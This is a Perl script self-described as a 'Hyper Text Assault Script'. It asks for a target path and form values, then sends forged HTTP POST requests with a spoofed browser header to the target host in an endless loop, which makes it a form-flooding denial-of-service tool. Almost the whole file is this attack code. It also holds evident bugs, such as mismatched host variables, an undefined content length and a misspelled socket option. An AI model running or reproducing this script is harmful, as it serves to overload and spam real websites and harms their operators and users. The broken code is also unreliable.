#!usr/bin/perl
use IO::Socket::INET;
print "Welcome";
while (!$ARGV[0]) {
   &usage; #change to usage subroutine
}
$x=1;
$gz00=1;
$Host = "$ARGV[0]";
$Port = 80;

print "\n Please enter...\n";
print "\n Path: (NOT SITE!):";
$url = <STDIN>;
chop($url);
print "First Form Name:";
$f1n = <STDIN>;
chop($f1n);
print "\n First Form Value:";
$f1v = <STDIN>;
chop($f1v);
print "\n amount of forms left:";
$amt = <STDIN>;
&aform(amt);
print "\n";
$PostGet = '';

###Subroutines
sub usage { #explanation of HTAS usage
   print "Usage{\n";
   print "Modules used:\n";
   print "IO::Socket::INET\n";
   print "-"x 10 . "\n";
   print "htas.pl <host>\n";
   print "Testing connection...\n";
   my $sock = IO::Socket::INET->new( PeerAddr => 'google.com', #yes i know not needed
                   PeerPort => 80,
                   Prot => 'tcp',
               )|| print "\nConnection Nonfunctional or website down.\n";
   print "Connection to test website (Google.com:80) successful.\n";
   print "Connection verified.\n" . ":>"x 40 . "\n";
   print "Hyper Text Assault Script version 1.0\n";
   print "This monster created by Xer0X\n}\n";
   exit;
   }

sub aform { #form creation subroutine
   $gzo = 0; #gzo = ground zer0
while ($gzo != $amt) {   
   print "Form " . $gzo . " name:";
   $bfn=<STDIN>;
   chop($bfn);
        $bfn=$bfn . $gzo;
   chop($bfn);
   print "Form " . $gzo . " value:";
   $bfv = <STDIN>;
   chop($bfv);
   $bfv = $bfv . $gzo;
   chop($bfv);
   $PostGet = "$PostGet" . "&" . "$bfn" . "=" . "$bfv";
   $gzo++;
   }
   &destroy;
}

sub printget {
   print "\n\n\n$PostGet";
}

sub destroy { #let us begin :D

while($x) {
print "$gz00";
$gz00++;
   my $sock = IO::Socket::INET->new( PeerAddr => "$Host",
                      PeerPort => 80,
                      Proto => "tcp",
               );
&destroy unless $sock;
print $sock "POST $url?$f1n=$f1v";
print $sock "Host: $host\n";
print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n";
print $sock "Referer: $host\n";
print $sock "Accept-Language: en-us\n";
print $sock "Content-Type: application/x-www-form-urlencoded\n";
print $sock "Accept-Encoding: gzip, deflate\n";
print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; sp-ME; rv:1.7.8) Gecko/19500101 Firefox/0.0.beta3\n";
print $sock "Connection: Keep-Alive\n";
print $sock "Cache-Control: no-cache\n";
print $sock "Content-Length: $lrg\n\n";
print $sock "$PostGet\n";
close($sock);
}
}
